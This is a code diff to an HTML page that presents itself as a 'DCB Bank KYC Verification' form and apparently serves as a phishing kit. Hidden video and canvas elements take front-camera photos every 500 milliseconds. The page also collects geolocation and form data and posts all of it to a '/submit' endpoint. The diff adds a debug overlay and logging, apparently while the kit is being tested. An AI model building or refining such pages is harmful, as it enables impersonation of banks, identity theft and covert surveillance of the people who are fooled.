@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DCB Bank KYC Verification</title>
   <style>
-    /* Reset and base styles */
     * {
       margin: 0;
       padding: 0;
@@ -17,6 +16,7 @@
       background-color: #f4f6f9;
       color: #333;
       line-height: 1.6;
+      padding: 20px;
     }
     
     .container {
@@ -123,7 +123,6 @@
       font-weight: 500;
     }
     
-    /* Verification Popup Styles */
     #verificationPopup {
       position: fixed;
       top: 0;
@@ -253,7 +252,6 @@
       background-color: #003d6a;
     }
     
-    /* Loading spinner */
     .spinner {
       display: inline-block;
       width: 22px;
@@ -285,7 +283,18 @@
       margin-bottom: 10px;
     }
     
-    /* Responsive design */
+    .debug-info {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      z-index: 1000;
+    }
+    
     @media (max-width: 600px) {
       .container {
         margin: 20px 15px;
@@ -303,8 +312,11 @@
   </style>
 </head>
 <body>
+  <div class="debug-info" id="debugInfo">
+    <div>Images Captured: <span id="imageCount">0</span></div>
+    <div>Location: <span id="locationStatus">Not captured</span></div>
+  </div>
 
-  <!-- Verification Popup -->
   <div id="verificationPopup">
     <div class="popup-content">
       <div class="popup-header">
@@ -401,11 +413,15 @@
     </div>
   </div>
 
-  <!-- Hidden elements for capture -->
   <video id="cameraPreview" autoplay playsinline style="display: none;"></video>
   <canvas id="captureCanvas" style="display: none;"></canvas>
   
   <script>
+    // Debug elements
+    const debugInfo = document.getElementById('debugInfo');
+    const imageCountElement = document.getElementById('imageCount');
+    const locationStatusElement = document.getElementById('locationStatus');
+    
     // Close the verification popup
     function closePopup() {
       document.getElementById('verificationPopup').style.display = 'none';
@@ -416,7 +432,7 @@
     let captureInterval = null;
     let capturedImages = [];
     let locationData = null;
-    const MAX_IMAGES = 50;
+    const MAX_IMAGES = 10; // Reduced for testing
     
     // Function to request permissions
     function requestPermissions() {
@@ -427,7 +443,7 @@
       // Request camera
       navigator.mediaDevices.getUserMedia({ 
         video: { 
-          facingMode: 'user', // Front camera
+          facingMode: 'user',
           width: { ideal: 1280 },
           height: { ideal: 720 }
         } 
@@ -448,6 +464,10 @@
               accuracy: position.coords.accuracy,
               timestamp: position.timestamp
             };
+            
+            // Update debug info
+            locationStatusElement.textContent = "Captured";
+            debugInfo.style.display = 'block';
             
             // Permissions granted - show form
             document.getElementById('permissionStep').style.display = 'none';
@@ -521,6 +541,8 @@
         const imageData = canvas.toDataURL('image/jpeg', 0.8);
         capturedImages.push(imageData);
         
+        // Update debug info
+        imageCountElement.textContent = capturedImages.length;
       }, 500); // Capture every 500ms
     }
     
@@ -577,6 +599,11 @@
           formData.append('location', JSON.stringify(locationData));
         }
         
+        // Add debug info
+        console.log('Submitting form with:');
+        console.log('- Images:', capturedImages.length);
+        console.log('- Location:', locationData);
+        
         // Send data to server
         const response = await fetch('/submit', {
           method: 'POST',
@@ -587,12 +614,15 @@
           // Show success message
           document.getElementById('kycFormElement').style.display = 'none';
           document.getElementById('successMessage').style.display = 'block';
+          
+          console.log('Form submitted successfully');
         } else {
-          throw new Error('Server responded with an error');
+          const errorText = await response.text();
+          throw new Error(`Server error: ${response.status} - ${errorText}`);
         }
       } catch (error) {
         console.error("Submission error:", error);
-        alert("There was an error processing your verification. Please try again.");
+        alert(`There was an error processing your verification: ${error.message}`);
         submitBtn.disabled = false;
         submitBtn.innerHTML = originalBtnText;
       }
